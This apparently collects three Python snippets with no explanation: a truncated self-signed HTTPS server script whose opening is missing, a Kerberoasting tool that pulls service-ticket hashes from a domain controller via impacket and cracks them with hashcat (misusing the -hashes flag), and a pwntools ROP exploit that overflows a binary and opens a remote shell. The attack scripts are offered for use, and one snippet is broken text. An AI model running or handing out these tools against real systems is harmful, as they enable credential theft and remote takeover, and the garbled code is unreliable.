```python
import http.server, ssl, pathlib, subprocess, sys

        "openssl", "req", "-newkey", "rsa:2048", "-nodes", "-keyout", "selfsigned.key",
        "-x509", "-days", "365", "-out", "selfsigned.crt",
        "-subj", "/CN=localhost"
    ])

handler = http.server.SimpleHTTPRequestHandler
httpd = http.server.HTTPServer(("0.0.0.0", 8443), handler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile=str(cert_path), server_side=True)
print("Serving HTTPS on port 8443")
httpd.serve_forever()
```

```python
#!/usr/bin/env python3
import argparse, subprocess, os, sys, tempfile

def run_kerberoast(domain, user, password, dc):
    cmd = [
        "python3", "-m", "impacket.examples.GetUserSPNs",
        "-hashes", f"{user}:{password}",
        "-dc-ip", dc,
        f"{domain}/{user}"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        sys.exit(result.stderr)
    return result.stdout

def extract_hashes(output, out_file):
    with open(out_file, "w") as f:
        for line in output.splitlines():
            if line.startswith("$krb5tgs$"):
                f.write(line + "\n")

def crack_hashes(hash_file, mask, hashcat_path="hashcat"):
    cmd = [hashcat_path, "-m", "13100", hash_file, mask, "--force"]
    subprocess.run(cmd)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--domain", required=True)
    p.add_argument("--user", required=True)
    p.add_argument("--password", required=True)
    p.add_argument("--dc", required=True, help="Domain controller IP")
    p.add_argument("--mask", required=True, help="Hashcat mask, e.g. ?a?a?a?a?a?a")
    p.add_argument("--hashcat", default="hashcat")
    args = p.parse_args()

    out = run_kerberoast(args.domain, args.user, args.password, args.dc)
    with tempfile.NamedTemporaryFile(delete=False) as tf:
        hash_file = tf.name
    extract_hashes(out, hash_file)
    crack_hashes(hash_file, args.mask, args.hashcat)
    os.remove(hash_file)

if __name__ == "__main__":
    main()
```

```python
#!/usr/bin/env python3
from pwn import *

binary = "./vuln"
elf = ELF(binary)
context.binary = elf
context.arch = "amd64"

def find_offset():
    payload = cyclic(200)
    p = process(binary)
    p.sendlineafter(b"> ", payload)
    p.wait()
    core = p.corefile
    return cyclic_find(core.read(core.rsp, 4))

def filter_badchars(data, bad=b"\x00\x0a\x0d"):
    return all(c not in bad for c in data)

offset = find_offset()

rop = ROP(elf)
rop.raw(elf.symbols["pop_rdi_ret"])
rop.raw(next(elf.search(b"/bin/sh\x00")))
rop.raw(elf.symbols["system"])

payload = flat(
    b"A" * offset,
    rop.chain()
)

assert filter_badchars(payload)

io = remote("example.com", 1337)  # replace with target
io.sendlineafter(b"> ", payload)
io.interactive()
```
